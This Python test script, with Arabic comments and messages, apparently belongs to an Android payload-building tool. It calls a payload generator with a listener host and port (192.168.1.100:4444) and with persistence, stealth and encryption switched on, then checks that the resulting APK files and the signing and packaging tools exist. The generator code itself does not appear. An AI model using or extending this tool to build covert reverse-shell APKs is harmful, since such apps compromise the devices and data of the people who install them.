#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
اختبار إنشاء APK
APK Creation Test
"""

import os
import sys
from pathlib import Path

def test_apk_creation():
    """اختبار إنشاء APK"""
    print("🧪 اختبار إنشاء APK...")
    
    try:
        # استيراد الوحدات
        from core.payload_generator import PayloadGenerator
        from tools.apk_builder import APKBuilder
        from tools.external_builder import ExternalAPKBuilder
        
        print("✅ تم استيراد الوحدات بنجاح")
        
        # إنشاء مولد البايلود
        generator = PayloadGenerator()
        print("✅ تم إنشاء مولد البايلود")
        
        # إعدادات البايلود
        config = {
            'name': 'test_payload',
            'lhost': '192.168.1.100',
            'lport': 4444,
            'encryption': True,
            'persistence': True,
            'stealth': True
        }
        
        print("📱 إنشاء بايلود تجريبي...")
        
        # إنشاء البايلود
        result = generator.create_payload(
            name=config['name'],
            lhost=config['lhost'],
            lport=config['lport'],
            encryption=config['encryption'],
            persistence=config['persistence'],
            stealth=config['stealth']
        )
        
        print("✅ تم إنشاء البايلود بنجاح!")
        print(f"📁 مسار APK: {result['apk_path']}")
        print(f"📄 ملف التكوين: {result['config_path']}")
        print(f"🔧 ملف التثبيت: {result['installer_path']}")
        print(f"📖 ملف README: {result['readme_path']}")
        
        # التحقق من وجود الملفات
        for key, path in result.items():
            if Path(path).exists():
                size = Path(path).stat().st_size
                print(f"✅ {key}: {path} ({size} bytes)")
            else:
                print(f"❌ {key}: {path} (غير موجود)")
        
        return True
        
    except Exception as e:
        print(f"❌ خطأ في اختبار إنشاء APK: {e}")
        import traceback
        traceback.print_exc()
        return False

def test_apk_builders():
    """اختبار أدوات بناء APK"""
    print("\n🔧 اختبار أدوات بناء APK...")
    
    try:
        # اختبار APKBuilder
        from tools.apk_builder import APKBuilder
        apk_builder = APKBuilder()
        
        if apk_builder.check_requirements():
            print("✅ APKBuilder: متطلبات مكتملة")
        else:
            print("⚠️ APKBuilder: متطلبات غير مكتملة")
        
        # اختبار ExternalAPKBuilder
        from tools.external_builder import ExternalAPKBuilder
        external_builder = ExternalAPKBuilder()
        
        tools_status = {
            'apktool': external_builder.tools['apktool'] is not None,
            'jarsigner': external_builder.tools['jarsigner'] is not None,
            'zipalign': external_builder.tools['zipalign'] is not None,
            'aapt': external_builder.tools['aapt'] is not None
        }
        
        for tool, available in tools_status.items():
            status = "✅" if available else "❌"
            print(f"{status} {tool}: {'متوفر' if available else 'غير متوفر'}")
        
        return True
        
    except Exception as e:
        print(f"❌ خطأ في اختبار أدوات بناء APK: {e}")
        return False

def test_sdk_installer():
    """اختبار مثبت Android SDK"""
    print("\n📦 اختبار مثبت Android SDK...")
    
    try:
        from tools.sdk_installer import SDKInstaller
        sdk_installer = SDKInstaller()
        
        # التحقق من Java
        if sdk_installer.check_java_installation():
            print("✅ Java: مثبت")
        else:
            print("❌ Java: غير مثبت")
        
        # التحقق من Android SDK
        android_home = os.environ.get('ANDROID_HOME') or os.environ.get('ANDROID_SDK_ROOT')
        if android_home and os.path.exists(android_home):
            print(f"✅ Android SDK: {android_home}")
        else:
            print("❌ Android SDK: غير مثبت")
        
        return True
        
    except Exception as e:
        print(f"❌ خطأ في اختبار مثبت Android SDK: {e}")
        return False

def main():
    """الدالة الرئيسية"""
    print("🚀 بدء اختبار أداة بايلودات الأندرويد")
    print("=" * 50)
    
    # إنشاء المجلدات المطلوبة
    os.makedirs("output", exist_ok=True)
    os.makedirs("logs", exist_ok=True)
    
    # تشغيل الاختبارات
    tests = [
        ("إنشاء APK", test_apk_creation),
        ("أدوات بناء APK", test_apk_builders),
        ("مثبت Android SDK", test_sdk_installer)
    ]
    
    results = []
    
    for test_name, test_func in tests:
        print(f"\n📋 اختبار: {test_name}")
        print("-" * 30)
        
        try:
            result = test_func()
            results.append((test_name, result))
        except Exception as e:
            print(f"❌ خطأ في اختبار {test_name}: {e}")
            results.append((test_name, False))
    
    # عرض النتائج
    print("\n" + "=" * 50)
    print("📊 نتائج الاختبارات")
    print("=" * 50)
    
    passed = 0
    total = len(results)
    
    for test_name, result in results:
        status = "✅ نجح" if result else "❌ فشل"
        print(f"{status} {test_name}")
        if result:
            passed += 1
    
    print(f"\n📈 النتيجة: {passed}/{total} اختبارات نجحت")
    
    if passed == total:
        print("🎉 جميع الاختبارات نجحت! الأداة جاهزة للاستخدام.")
    else:
        print("⚠️ بعض الاختبارات فشلت. راجع الأخطاء أعلاه.")
    
    return passed == total

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)
